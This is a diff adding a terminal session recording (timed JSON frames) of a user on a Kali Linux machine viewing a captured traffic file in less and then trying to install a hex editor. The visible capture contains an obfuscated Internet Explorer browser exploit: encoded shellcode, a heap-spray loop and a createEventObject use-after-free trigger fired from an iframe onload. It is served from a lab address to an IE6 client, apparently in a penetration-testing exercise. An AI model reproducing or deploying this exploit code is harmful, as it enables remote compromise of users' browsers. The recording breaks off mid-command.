+      "\r\u001b[Ku2474%u29f4%u58c9%u4bb1%u3fbd%u8e94%u836e%ufce8%u6831%u0313%u8757%u9b6c%u6326%u9624%u93d7%ube39%u6cae%u3fc2%ue5d0%u0e27%u92c2%u232c%ud1d2%uc \u0008:\u001b[K"
+    ],
+    [
+      0.031222,
+      "\r\u001b[K861%ub499%u5b91%u10ef%uec95%u4745%ued98%u4768%u2d76%u3beb%u6285%u02cb%u7746%u420a%u78bb%u1b5e%u2bb7%u284e%uf785%ufe6f%u4881%u7b17%u3c55%u82a \u0008:\u001b[K"
+    ],
+    [
+      0.030461,
+      "\r\u001b[Kd%ued86%ucdba%u853e%uede4%u4a3f%ud2f7%ue776%ua1c3%u2188%u491a%u0dbb%u74f0%u8073%ub009%u7bb4%uca7c%u06c6%u0986%udcb4%u8c03%u961e%u74b3%u7b9e% \u0008:\u001b[K"
+    ],
+    [
+      0.031087,
+      "\r\u001b[Kufe25%u30ac%u5822%uc7b1%ud2e7%u4ccd%u3506%u1644%u912c%ucc0c%u804d%ua3e8%ud272%u1b55%u98d6%u4874%uc360%ubd10%ufc5e%ua9e0%u8fe9%u76d2%u1841%uf \u0008:\u001b[K"
+    ],
+    [
+      0.034869,
+      "\r\u001b[Ke5f%udf4f%ud5a0%u4f37%ud65f%u5947%u82a4%uf117%uab0d%u01fc%u7eb1%u5252%ud11d%u0212%u81dd%u48fa%ufed2%u731a%u9738%u89b0%u92ab%u984e%ucb21%u9c4 \u0008:\u001b[K"
+    ],
+    [
+      0.030626,
+      "\r\u001b[Kc%u5724%u7ad9%u772c%ud58f%ueed9%uae8a%uee78%ucb01%u64bb%u2ba5%u8d75%u3fc0%u7de2%u629f%u82a5%u080a%u174a%u9bb0%u8f1d%ufaba%u106a%u2945%u99e1% \u0008:\u001b[K"
+    ],
+    [
+      0.032092,
+      "\r\u001b[Ku92d3%ue59e%u1333%ub05f%u1359%u6437%u4039%u6b22%uf494%ufeff%uad16%ua9ac%u537e%u9e8a%uac21%u1ef9%u7b1e%ua4c4%u0956%u6524');\r\n:\u001b[K"
+    ],
+    [
+      0.029241,
+      "\r\u001b[K  var wFbKpUHikXyRVJZQIYEsmsTVjNNgHkBIdNwmxtUMqQzsbpqNyO = lwFZUGyxMIWTGMBfMqyKxGTRyRuDasLmlzjI( \"%\" + \"u\" + \"0\" + \"c\" + \"0\" + \"d\" + \"%u\" +  \u0008:\u001b[K"
+    ],
+    [
+      0.032531,
+      "\r\u001b[K\"0\" + \"c\" + \"0\" + \"d\" );\r\n:\u001b[K"
+    ],
+    [
+      0.031468,
+      "\r\u001b[K  do { wFbKpUHikXyRVJZQIYEsmsTVjNNgHkBIdNwmxtUMqQzsbpqNyO += wFbKpUHikXyRVJZQIYEsmsTVjNNgHkBIdNwmxtUMqQzsbpqNyO } while( wFbKpUHikXyRVJZQIYE \u0008:\u001b[K"
+    ],
+    [
+      0.032268,
+      "\r\u001b[KsmsTVjNNgHkBIdNwmxtUMqQzsbpqNyO.length \u003c 0xd0000 );\r\n:\u001b[K"
+    ],
+    [
+      0.029155,
+      "\r\u001b[K  for (PEf = 0; PEf \u003c 150; PEf++) VTWgXjXYoSTHY[PEf] = wFbKpUHikXyRVJZQIYEsmsTVjNNgHkBIdNwmxtUMqQzsbpqNyO + LLVcUmerhpt;\r\n:\u001b[K"
+    ],
+    [
+      0.032423,
+      "\r\u001b[K}\r\n:\u001b[K"
+    ],
+    [
+      0.031592,
+      "\r\u001b[Kfunction CkoNbET(OZaAHBUXXTUpHcLuyXFerYFtnsKQFzFRKsWwuisbjjaqDCeJARnzqPxUhjKhBZZJkohA)\r\n:\u001b[K"
+    ],
+    [
+      0.032169,
+      "\r\u001b[K{\r\n:\u001b[K"
+    ],
+    [
+      0.030693,
+      "\r\u001b[K  XyFfBwnvNTHaNNqCqPKVxmwOjqwptvyJsLDUgweSdLDgm();\r\n:\u001b[K"
+    ],
+    [
+      0.030437,
+      "\r\u001b[K  dccahTiTDPLKAIGwlKLcqCTAoePblbBvEYSuWFWodqQrztYYizoWxwqlMJzsyPhKfhPwpLGFWIflTpaOhwy = document.createEventObject(OZaAHBUXXTUpHcLuyXFerYFtn \u0008:\u001b[K"
+    ],
+    [
+      0.031537,
+      "\r\u001b[KsKQFzFRKsWwuisbjjaqDCeJARnzqPxUhjKhBZZJkohA);\r\n:\u001b[K"
+    ],
+    [
+      0.031928,
+      "\r\u001b[K  document.getElementById(\"jWfnzfLhenIemfKFynaujTIQUhzZVHTcZuJaeFtmqBXYrwn\").innerHTML = \"\";\r\n:\u001b[K"
+    ],
+    [
+      0.029483,
+      "\r\u001b[K  window.setInterval(vldTpeimKzBERsNeByodkqCLvbmselSexjNZwNtHDaWDkZKQHlZIKIZtQqNeWtWcZzpDoMXcAjkyyhRONrLy, 50);\r\n:\u001b[K"
+    ],
+    [
+      0.032891,
+      "\r\u001b[K}\r\n:\u001b[K"
+    ],
+    [
+      0.031788,
+      "\r\u001b[Kfunction vldTpeimKzBERsNeByodkqCLvbmselSexjNZwNtHDaWDkZKQHlZIKIZtQqNeWtWcZzpDoMXcAjkyyhRONrLy()\r\n:\u001b[K"
+    ],
+    [
+      0.030907,
+      "\r\u001b[K{\r\n:\u001b[K"
+    ],
+    [
+      0.031297,
+      "\r\u001b[K  p = \"\\u0c0f\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\ \u0008:\u001b[K"
+    ],
+    [
+      0.033260,
+      "\r\u001b[Ku0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\";\r\n:\u001b[K"
+    ],
+    [
+      0.030211,
+      "\r\u001b[K  for (i = 0; i \u003c qSNgVkOrdIjaiFpPTfDjbPHQppHSGtzpmOOyqEbLEFxNqAxicRyZKKWiRWmUaDHFOuzHPHqLrRFSzQuPusTnQyqpQwVpARdlR.length; i++)\r\n:\u001b[K"
+    ],
+    [
+      0.031441,
+      "\r\u001b[K  {\r\n:\u001b[K"
+    ],
+    [
+      0.031707,
+      "\r\u001b[K    qSNgVkOrdIjaiFpPTfDjbPHQppHSGtzpmOOyqEbLEFxNqAxicRyZKKWiRWmUaDHFOuzHPHqLrRFSzQuPusTnQyqpQwVpARdlR[i].data = p;\r\n:\u001b[K"
+    ],
+    [
+      0.030073,
+      "\r\u001b[K  }\r\n:\u001b[K"
+    ],
+    [
+      0.031594,
+      "\r\u001b[K  var t = dccahTiTDPLKAIGwlKLcqCTAoePblbBvEYSuWFWodqQrztYYizoWxwqlMJzsyPhKfhPwpLGFWIflTpaOhwy.srcElement;\r\n:\u001b[K"
+    ],
+    [
+      0.032065,
+      "\r\u001b[K}\r\n:\u001b[K"
+    ],
+    [
+      0.030859,
+      "\r\u001b[K\u003c/script\u003e\r\n:\u001b[K"
+    ],
+    [
+      0.031103,
+      "\r\u001b[K\u003c/head\u003e\r\n:\u001b[K"
+    ],
+    [
+      0.029776,
+      "\r\u001b[K\u003cbody\u003e\r\n:\u001b[K"
+    ],
+    [
+      0.031950,
+      "\r\u001b[K\u003cspan id=\"jWfnzfLhenIemfKFynaujTIQUhzZVHTcZuJaeFtmqBXYrwn\"\u003e\u003ciframe src=\"/index.phpmfKSxSANkeTeNrah.gif\" onload=\"CkoNbET(event)\" /\u003e\u003c/span\u003e\u003c/b \u0008:\u001b[K"
+    ],
+    [
+      0.029651,
+      "\r\u001b[Kody\u003e\u003c/html\u003e\r\n:\u001b[K"
+    ],
+    [
+      0.030868,
+      "\r\u001b[K\u003c/body\u003e\r\n:\u001b[K"
+    ],
+    [
+      0.032651,
+      "\r\u001b[K\u003c/html\u003eGET /index.phpmfKSxSANkeTeNrah.gif HTTP/1.1\r\n:\u001b[K"
+    ],
+    [
+      0.031351,
+      "\r\u001b[KAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n:\u001b[K"
+    ],
+    [
+      0.029773,
+      "\r\u001b[KReferer: http://10.10.10.10:8080/index.php\r\n:\u001b[K"
+    ],
+    [
+      0.031047,
+      "\r\u001b[KAccept-Language: en-us\r\n:\u001b[K"
+    ],
+    [
+      0.031357,
+      "\r\u001b[KAccept-Encoding: gzip, deflate\r\n:\u001b[K"
+    ],
+    [
+      0.031229,
+      "\r\u001b[KUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n:\u001b[K"
+    ],
+    [
+      0.031108,
+      "\r\u001b[KHost: 10.10.10.10:8080\r\n:\u001b[K"
+    ],
+    [
+      0.030562,
+      "\r\u001b[KConnection: Keep-Alive\r\n:\u001b[K"
+    ],
+    [
+      0.030904,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.031282,
+      "\r\u001b[KHTTP/1.1 200 OK\r\n:\u001b[K"
+    ],
+    [
+      0.030687,
+      "\r\u001b[KContent-Type: image/gif\r\n:\u001b[K"
+    ],
+    [
+      0.031555,
+      "\r\u001b[KConnection: Keep-Alive\r\n:\u001b[K"
+    ],
+    [
+      0.031709,
+      "\r\u001b[KServer: Apache\r\n:\u001b[K"
+    ],
+    [
+      0.030351,
+      "\r\u001b[KContent-Length: 43\r\n:\u001b[K"
+    ],
+    [
+      0.030423,
+      "\r\u001b[K\r\n:\u001b[K"
+    ],
+    [
+      0.031092,
+      "\r\u001b[KGIF89a\u001b[7m^A^@^A^@\u003c80\u003e^@^@^@^@^@^@^@^@\u001b[27m!\u001b[7m\u003cF9\u003e^D^A^@^@^@^@\u001b[27m,\u001b[7m^@^@^@^@^A^@^A^@^@^B^B\u001b[27mD\u001b[7m^A^@\u001b[27m;\r\n\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.030333,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.030859,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.031957,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.031413,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.030102,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.030581,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.030555,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.030589,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.030042,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.029609,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.031260,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.030313,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.030300,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.029275,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.031748,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.031350,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.492588,
+      "\r\u001b[K\u001b[H\u001bM  XyFfBwnvNTHaNNqCqPKVxmwOjqwptvyJsLDUgweSdLDgm();\r\n\u001b[38;1H\r\u001b[K:\u001b[K"
+    ],
+    [
+      0.343974,
+      "\r\u001b[KGIF89a\u001b[7m^A^@^A^@\u003c80\u003e^@^@^@^@^@^@^@^@\u001b[27m!\u001b[7m\u003cF9\u003e^D^A^@^@^@^@\u001b[27m,\u001b[7m^@^@^@^@^A^@^A^@^@^B^B\u001b[27mD\u001b[7m^A^@\u001b[27m;\r\n\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      1.007978,
+      "\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.416165,
+      "\r\u001b[K\u001b[H\u001bM  XyFfBwnvNTHaNNqCqPKVxmwOjqwptvyJsLDUgweSdLDgm();\r\n\u001b[38;1H\r\u001b[K:\u001b[K"
+    ],
+    [
+      0.519853,
+      "\r\u001b[KGIF89a\u001b[7m^A^@^A^@\u003c80\u003e^@^@^@^@^@^@^@^@\u001b[27m!\u001b[7m\u003cF9\u003e^D^A^@^@^@^@\u001b[27m,\u001b[7m^@^@^@^@^A^@^A^@^@^B^B\u001b[27mD\u001b[7m^A^@\u001b[27m;\r\n\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      1.992284,
+      "\r\u001b[K...skipping...\r\n\r\n                   \u001b[1mSUMMARY\u001b[0m \u001b[1mOF\u001b[0m \u001b[1mLESS\u001b[0m \u001b[1mCOMMANDS\u001b[0m\r\n\r\n      Commands marked with * may be preceded by a number, \u001b[4mN\u001b[24m.\r\n      Notes in parentheses indicate the behavior if \u001b[4mN\u001b[24m is given.\r\n\r\n  h  H                 Display this help.\r\n  q  :q  Q  :Q  ZZ     Exit.\r\n ---------------------------------------------------------------------------\r\n\r\n                           \u001b[1mMOVING\u001b[0m\r\n\r\n  e  ^E  j  ^N  CR  *  Forward  one line   (or \u001b[4mN\u001b[24m lines).\r\n  y  ^Y  k  ^K  ^P  *  Backward one line   (or \u001b[4mN\u001b[24m lines).\r\n  f  ^F  ^V  SPACE  *  Forward  one window (or \u001b[4mN\u001b[24m lines).\r\n  b  ^B  ESC-v      *  Backward one window (or \u001b[4mN\u001b[24m lines).\r\n  z                 *  Forward  one window (and set window to \u001b[4mN\u001b[24m).\r\n  w                 *  Backward one window (and set window to \u001b[4mN\u001b[24m).\r\n  ESC-SPACE         *  Forward  one window, but don't stop at end-of-file.\r\n  d  ^D             *  Forward  one half-window (and set half-window to \u001b[4mN\u001b[24m).\r\n  u  ^U             *  Backward one half-window (and set half-window to \u001b[4mN\u001b[24m).\r\n  ESC-)  RightArrow *  Left  one half screen width (or \u001b[4mN\u001b[24m positions).\r\n  ESC-(  LeftArrow  *  Right one half screen width (or \u001b[4mN\u001b[24m positions).\r\n  F                    Forward forever; like \"tail -f\".\r\n  r  ^R  ^L            Repaint screen.\r\n  R                    Repaint screen, discarding buffered input.\r\n        ---------------------------------------------------\r\n        Default \"window\" is the screen height.\r\n        Default \"half-window\" is half of the screen height.\r\n ---------------------------------------------------------------------------\r\n\r\n                          \u001b[1mSEARCHING\u001b[0m\r\n\r\n  /\u001b[4mpattern\u001b[24m          *  Search forward for (\u001b[4mN\u001b[24m-th) matching line.\r\n  ?\u001b[4mpattern\u001b[24m          *  Search backward for (\u001b[4mN\u001b[24m-th) matching line.\r\n  n                 *  Repeat previous search (for \u001b[4mN\u001b[24m-th occurrence).\r\n  N                 *  Repeat previous search in reverse direction.\r\n\u001b[7mHELP -- Press RETURN for more, or q when done\u001b[27m\u001b[K"
+    ],
+    [
+      0.447523,
+      "\r\u001b[K  ESC-n             *  Repeat previous search, spanning files.\r\n\u001b[7mHELP -- Press RETURN for more, or q when done\u001b[27m\u001b[K"
+    ],
+    [
+      0.664202,
+      "\r\u001b[K\u001b[H\u001bM\r\n\u001b[38;1H\r\u001b[K\u001b[7mHELP -- Press RETURN for more, or q when done\u001b[27m\u001b[K"
+    ],
+    [
+      0.448146,
+      "\r\u001b[K  ESC-n             *  Repeat previous search, spanning files.\r\n\u001b[7mHELP -- Press RETURN for more, or q when done\u001b[27m\u001b[K"
+    ],
+    [
+      0.583783,
+      "\r\u001b[K  ESC-N             *  Repeat previous search, reverse dir. \u0026 spanning files.\r\n\u001b[7mHELP -- Press RETURN for more, or q when done\u001b[27m\u001b[K"
+    ],
+    [
+      0.501329,
+      "\r\u001b[K  ESC-u                Undo (toggle) search highlighting.\r\n\u001b[7mHELP -- Press RETURN for more, or q when done\u001b[27m\u001b[K"
+    ],
+    [
+      0.033011,
+      "\r\u001b[K  \u0026\u001b[4mpattern\u001b[24m          *  Display only matching lines\r\n\u001b[7mHELP -- Press RETURN for more, or q when done\u001b[27m\u001b[K"
+    ],
+    [
+      0.030707,
+      "\r\u001b[K        ---------------------------------------------------\r\n\u001b[7mHELP -- Press RETURN for more, or q when done\u001b[27m\u001b[K"
+    ],
+    [
+      0.030273,
+      "\r\u001b[K        Search patterns may be modified by one or more of:\r\n\u001b[7mHELP -- Press RETURN for more, or q when done\u001b[27m\u001b[K"
+    ],
+    [
+      0.069342,
+      "...skipping...\r\n  dccahTiTDPLKAIGwlKLcqCTAoePblbBvEYSuWFWodqQrztYYizoWxwqlMJzsyPhKfhPwpLGFWIflTpaOhwy = document.createEventObject(OZaAHBUXXTUpHcLuyXFerYFtn \u0008sKQFzFRKsWwuisbjjaqDCeJARnzqPxUhjKhBZZJkohA);\r\n  document.getElementById(\"jWfnzfLhenIemfKFynaujTIQUhzZVHTcZuJaeFtmqBXYrwn\").innerHTML = \"\";\r\n  window.setInterval(vldTpeimKzBERsNeByodkqCLvbmselSexjNZwNtHDaWDkZKQHlZIKIZtQqNeWtWcZzpDoMXcAjkyyhRONrLy, 50);\r\n}\r\nfunction vldTpeimKzBERsNeByodkqCLvbmselSexjNZwNtHDaWDkZKQHlZIKIZtQqNeWtWcZzpDoMXcAjkyyhRONrLy()\r\n{\r\n  p = \"\\u0c0f\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\ \u0008u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\\u0c0d\";\r\n  for (i = 0; i \u003c qSNgVkOrdIjaiFpPTfDjbPHQppHSGtzpmOOyqEbLEFxNqAxicRyZKKWiRWmUaDHFOuzHPHqLrRFSzQuPusTnQyqpQwVpARdlR.length; i++)\r\n  {\r\n    qSNgVkOrdIjaiFpPTfDjbPHQppHSGtzpmOOyqEbLEFxNqAxicRyZKKWiRWmUaDHFOuzHPHqLrRFSzQuPusTnQyqpQwVpARdlR[i].data = p;\r\n  }\r\n  var t = dccahTiTDPLKAIGwlKLcqCTAoePblbBvEYSuWFWodqQrztYYizoWxwqlMJzsyPhKfhPwpLGFWIflTpaOhwy.srcElement;\r\n}\r\n\u003c/script\u003e\r\n\u003c/head\u003e\r\n\u003cbody\u003e\r\n\u003cspan id=\"jWfnzfLhenIemfKFynaujTIQUhzZVHTcZuJaeFtmqBXYrwn\"\u003e\u003ciframe src=\"/index.phpmfKSxSANkeTeNrah.gif\" onload=\"CkoNbET(event)\" /\u003e\u003c/span\u003e\u003c/b \u0008ody\u003e\u003c/html\u003e\r\n\u003c/body\u003e\r\n\u003c/html\u003eGET /index.phpmfKSxSANkeTeNrah.gif HTTP/1.1\r\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\nReferer: http://10.10.10.10:8080/index.php\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\nHost: 10.10.10.10:8080\r\nConnection: Keep-Alive\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: image/gif\r\nConnection: Keep-Alive\r\nServer: Apache\r\nContent-Length: 43\r\n\r\nGIF89a\u001b[7m^A^@^A^@\u003c80\u003e^@^@^@^@^@^@^@^@\u001b[27m!\u001b[7m\u003cF9\u003e^D^A^@^@^@^@\u001b[27m,\u001b[7m^@^@^@^@^A^@^A^@^@^B^B\u001b[27mD\u001b[7m^A^@\u001b[27m;\r\n\u001b[7moutput.out (END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.687777,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.623652,
+      "\r\u001b[K\u001b[H\u001bM  XyFfBwnvNTHaNNqCqPKVxmwOjqwptvyJsLDUgweSdLDgm();\r\n\u001b[38;1H\r\u001b[K:\u001b[K"
+    ],
+    [
+      0.456131,
+      "\r\u001b[KGIF89a\u001b[7m^A^@^A^@\u003c80\u003e^@^@^@^@^@^@^@^@\u001b[27m!\u001b[7m\u003cF9\u003e^D^A^@^@^@^@\u001b[27m,\u001b[7m^@^@^@^@^A^@^A^@^@^B^B\u001b[27mD\u001b[7m^A^@\u001b[27m;\r\n\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      0.432002,
+      "\r\u001b[K\u0007\r\u001b[K\u001b[7m(END)\u001b[27m\u001b[K"
+    ],
+    [
+      6.663763,
+      "\r\u001b[K\u001b[?1l\u001b\u003e\u001b[?1049l\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.001462,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      0.957623,
+      "b"
+    ],
+    [
+      0.224326,
+      "\u0008bl"
+    ],
+    [
+      0.071781,
+      "e"
+    ],
+    [
+      0.079981,
+      "s"
+    ],
+    [
+      0.455461,
+      "s"
+    ],
+    [
+      0.392718,
+      " "
+    ],
+    [
+      0.328090,
+      "o"
+    ],
+    [
+      0.072157,
+      "u"
+    ],
+    [
+      0.071747,
+      "t"
+    ],
+    [
+      0.115439,
+      "put.out\u001b[1m \u001b[0m"
+    ],
+    [
+      0.388404,
+      "\u0008\u001b[0m \u0008"
+    ],
+    [
+      0.000042,
+      "\r"
+    ],
+    [
+      0.000009,
+      "\r\n"
+    ],
+    [
+      0.001659,
+      "zsh: command not found: bless"
+    ],
+    [
+      0.000037,
+      "\r\n"
+    ],
+    [
+      0.000408,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.001026,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      225.633420,
+      "o"
+    ],
+    [
+      0.009190,
+      "\u0008op"
+    ],
+    [
+      0.451038,
+      "\u0008\u0008o \u0008"
+    ],
+    [
+      0.135514,
+      "\u0008 \u0008"
+    ],
+    [
+      0.544150,
+      "g"
+    ],
+    [
+      0.071963,
+      "\u0008gn"
+    ],
+    [
+      0.104008,
+      "o"
+    ],
+    [
+      0.231788,
+      "m"
+    ],
+    [
+      0.111959,
+      "e"
+    ],
+    [
+      0.208289,
+      "-"
+    ],
+    [
+      0.232201,
+      "o"
+    ],
+    [
+      0.095658,
+      "p"
+    ],
+    [
+      0.048488,
+      "e"
+    ],
+    [
+      0.151853,
+      "n"
+    ],
+    [
+      0.511679,
+      " "
+    ],
+    [
+      0.664124,
+      "o"
+    ],
+    [
+      0.072092,
+      "u"
+    ],
+    [
+      0.039427,
+      "tput.out\u001b[1m \u001b[0m"
+    ],
+    [
+      0.441576,
+      "\u0008\u001b[0m \u0008\r\r\n"
+    ],
+    [
+      0.168899,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.007433,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      25.914043,
+      "g"
+    ],
+    [
+      0.103842,
+      "\u0008gp"
+    ],
+    [
+      0.496121,
+      "\u0008\u0008g \u0008"
+    ],
+    [
+      0.152198,
+      "\u0008 \u0008"
+    ],
+    [
+      0.064457,
+      "a"
+    ],
+    [
+      0.151330,
+      "\u0008ap"
+    ],
+    [
+      0.304210,
+      "t"
+    ],
+    [
+      0.431938,
+      "-"
+    ],
+    [
+      0.559993,
+      "g"
+    ],
+    [
+      4.000381,
+      "\u0008 \u0008"
+    ],
+    [
+      0.111533,
+      "c"
+    ],
+    [
+      0.144778,
+      "a"
+    ],
+    [
+      0.175329,
+      "c"
+    ],
+    [
+      0.135939,
+      "h"
+    ],
+    [
+      0.136005,
+      "e"
+    ],
+    [
+      0.135659,
+      " "
+    ],
+    [
+      0.096538,
+      "s"
+    ],
+    [
+      0.095882,
+      "e"
+    ],
+    [
+      0.088074,
+      "a"
+    ],
+    [
+      0.095179,
+      "r"
+    ],
+    [
+      0.233032,
+      "c"
+    ],
+    [
+      0.103686,
+      "h"
+    ],
+    [
+      0.071968,
+      " "
+    ],
+    [
+      0.184221,
+      "b"
+    ],
+    [
+      0.079859,
+      "l"
+    ],
+    [
+      0.136031,
+      "e"
+    ],
+    [
+      0.072186,
+      "s"
+    ],
+    [
+      0.200089,
+      "s"
+    ],
+    [
+      0.112249,
+      "\r\r\n"
+    ],
+    [
+      0.310269,
+      "bless - A full featured hexadecimal editor"
+    ],
+    [
+      0.000075,
+      "\r\n"
+    ],
+    [
+      0.086031,
+      "libacme-damn-perl - Perl module to unbless objects\r\nlibautobox-list-util-perl - Perl module providing List::Util functions as methods on arrays\r\nlibdata-walk-perl - Traverse Perl data structures\r\nlibhash-asobject-perl - Perl modules to treat hashes as objects, with arbitrary accessors/mutators\r\nlibmath-vec-perl - Object-Oriented Vector Math Methods in Perl\r\nlibmoosex-blessed-reconstruct-perl - Data::Visitor for creating Moose objects\r\nlibmoosex-yaml-perl - module to load Moose objects from YAML\r\n"
+    ],
+    [
+      0.081141,
+      "\u001b[1m\u001b[7m%\u001b[27m\u001b[1m\u001b[0m                                                                                                                                           \r \r"
+    ],
+    [
+      0.001161,
+      "\r\u001b[0m\u001b[27m\u001b[24m\u001b[J\u001b[44mmiles@kali\u001b[49m \u001b[1m\u001b[32m~/Desktop/Documents\r\n\r\u001b[37m % \u001b[0m\u001b[39m\u001b[49m\u001b[K"
+    ],
+    [
+      2.881130,
+      "s"
+    ],
+    [
+      0.112290,
+      "\u0008su"
+    ],
+    [
+      0.119446,
+      "d"
+    ],
+    [
+      0.080140,
+      "o"
+    ],
+    [
+      0.048083,
+      " "
+    ],
+    [
+      0.111909,
+      "a"
+    ],
+    [
+      0.072181,
+      "p"
+    ],
+    [
+      0.448118,
+      "-"
+    ],
+    [
+      0.311805,
+      "t"
+    ],
+    [
+      0.384067,
+      "\u0008 \u0008"
+    ],
+    [
+      0.159943,
+      "\u0008 \u0008"
+    ],
+    [
+      0.160099,
+      "t"
+    ],
+    [
+      0.088083,
+      "0"
+    ],
+    [
+      0.344036,
+      "g"
+    ],
+    [
+      0.335874,
+      "\u0008 \u0008"
+    ],
+    [
+      0.191945,
+      "-"
+    ],
+    [
+      0.432128,
+      "\u0008 \u0008"
+    ],
+    [
+      0.144034,
+      "\u0008 \u0008"
+    ],
+    [
+      0.216221,
+      "-"
+    ],
+    [
+      0.223877,
+      "g"
+    ],
+    [
+      0.112434,
+      "e"
+    ],
+    [
+      0.151374,
+      "t"
+    ],
+    [
+      0.648351,
+      " "
+    ],
+    [
+      0.167778,
+      "i"
+    ],
+    [
+      0.095970,
+      "s"
+    ],
+    [
+      0.015707,
+      "n"
+    ],
+    [
+      0.199872,
+      "t"
+    ],
+    [
+      0.104349,
+      "a"
+    ],
+    [
+      0.127992,
+      "l"
+    ],
+    [
+      0.328408,
+      "\u0008 \u0008"
+    ],
+    [
+      0.111895,
+      "\u0008 \u0008"
+    ],
+    [
+      0.128129,
+      "\u0008 \u0008"
+    ],
+    [
+      0.143671,
+      "\u0008 \u0008"
+    ],
+    [
+      0.152089,
+      "\u0008 \u0008"
+    ],
+    [
+      0.304087,
+      "n"
+    ],
+    [
+      0.096035,
+      "s"
+    ],
+    [
+      0.103645,
+      "a"
+    ],
+    [
+      0.136289,
+      "t"
+    ],
+    [
+      0.152065,
+      "l"
+    ],
+    [
+      0.119873,
+      "l"
+    ],
+    [
+      0.288095,
+      "\u0008 \u0008"
+    ],
+    [
+      0.111774,
+      "\u0008 \u0008"
+    ],
+    [
+      0.120121,
+      "\u0008 \u0008"
+    ],
+    [
+      0.168183,
+      "\u0008 \u0008"
+    ],
+    [
+      0.111771,
+      "\u0008 \u0008"
+    ],
+    [
+      0.127984,
+      "t"
+    ],
+    [
+      0.088051,
+      "a"
+    ],
+    [
+      0.344192,
+      "\u0008 \u0008"
+    ],
+    [
+      0.127661,
